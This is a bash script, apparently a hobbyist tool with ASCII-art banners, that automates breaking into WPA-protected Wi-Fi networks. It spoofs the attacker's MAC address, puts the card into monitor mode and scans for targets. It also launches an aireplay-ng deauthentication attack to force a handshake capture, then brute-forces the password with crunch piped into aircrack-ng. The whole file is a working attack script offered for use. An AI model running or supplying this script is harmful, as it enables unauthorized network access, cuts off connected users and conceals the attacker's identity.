#!/bin/bash

clear

#Intro
echo
echo
echo ──────▄▀▄─────▄▀▄
echo ─────▄█░░▀▀▀▀▀░░█▄
echo ─▄▄──█░░░░░░░░░░░█──▄▄
echo █▄▄█─█░░▀░░┬░░▀░░█─█▄▄█
echo
echo ░██╗░░░░░░░██╗███████╗██╗░░░░░░█████╗░░█████╗░███╗░░░███╗███████╗
echo ░██║░░██╗░░██║██╔════╝██║░░░░░██╔══██╗██╔══██╗████╗░████║██╔════╝
echo ░╚██╗████╗██╔╝█████╗░░██║░░░░░██║░░╚═╝██║░░██║██╔████╔██║█████╗░░
echo ░░████╔═████║░██╔══╝░░██║░░░░░██║░░██╗██║░░██║██║╚██╔╝██║██╔══╝░░
echo ░░╚██╔╝░╚██╔╝░███████╗███████╗╚█████╔╝╚█████╔╝██║░╚═╝░██║███████╗
echo ░░░╚═╝░░░╚═╝░░╚══════╝╚══════╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝

echo ░██████╗██╗░░░██╗██████╗░███████╗██████╗░░█████╗░██╗░░░██╗░██████╗░███████╗███████╗░█████╗░██████╗░
echo ██╔════╝██║░░░██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██║░░░██║██╔════╝░██╔════╝██╔════╝██╔══██╗╚════██╗
echo ╚█████╗░██║░░░██║██████╔╝█████╗░░██████╔╝██║░░██║██║░░░██║██║░░██╗░█████╗░░██████╗░██║░░██║░░███╔═╝
echo ░╚═══██╗██║░░░██║██╔══██╗██╔══╝░░██╔══██╗██║░░██║██║░░░██║██║░░╚██╗██╔══╝░░╚════██╗██║░░██║██╔══╝░░
echo ██████╔╝╚██████╔╝██║░░██║███████╗██║░░██║╚█████╔╝╚██████╔╝╚██████╔╝███████╗██████╔╝╚█████╔╝███████╗
echo ╚═════╝░░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═════╝░░╚════╝░╚══════╝
echo
echo
echo
name="$USER"
echo Welcome $name
echo 
echo


#wireless card in monitor mode
echo Wireless Card Name:
read wc
ifconfig $wc down
sudo macchanger -r wlan0 | grep "New MAC"
ifconfig $wc up
airmon-ng start $wc
airmon-ng check
sleep 2
airmon-ng check kill
airmon-ng check
sleep 5
clear

#Operation details output:
echo Re-Enter Wireless Card Name After Being put In Monitored mode  -type ifconfig In new Terminal to know --- Type the Same Name when nothing visible In ifconfig
echo
read wcm
echo Press Ctrl+c when u find your Network
sleep 2

sudo airodump-ng $wcm
sleep 2


#Selecting Network:
echo Enter the Name Of the Network
read nn
echo Enter Bssid of the Network
read bssid
echo Enter the channel number of the Network
read c
echo Enter the Name of the word file you would like the password saved In
read wf
echo 
echo
echo Press Ctrl+c When you see a WPA Handshake
echo
echo
echo You will see another terminal open up foR deauthentication purposes
echo DO NOT PANIC... this part of the program
echo wait... foR 3s
sleep 5
x-terminal-emulator -e aireplay-ng -0 20 -a $bssid $wcm &
airodump-ng --bssid $bssid -c $c $wcm -w $wf 

#cracking the code itself:
echo Enter the minimum number of Characters
read min
echo Enter the maximum number of characters
read max
echo Any clue about the format of the Password? helps the password crack faster
echo Specifies a pattern, eg: @@god@@@@ where the only the @ will change.
echo              @ will insert lower casE characters
echo              , will insert upper Case characters
echo              % will insert numbers
echo              ^ will insert symbols
echo
read clue
echo Type this following command In a new terminal to get the password
echo wait a minute
crunch $min $max -t $clue | aircrack-ng -w - $wf-01.cap -e $nn

#Resuming network services
sudo airmon-ng stop $wcm
service NetworkManager restart
echo Unless you are not usng a Virutal Macine you will be able to use your wifi card In normal mode now.
sleep 5


echo done
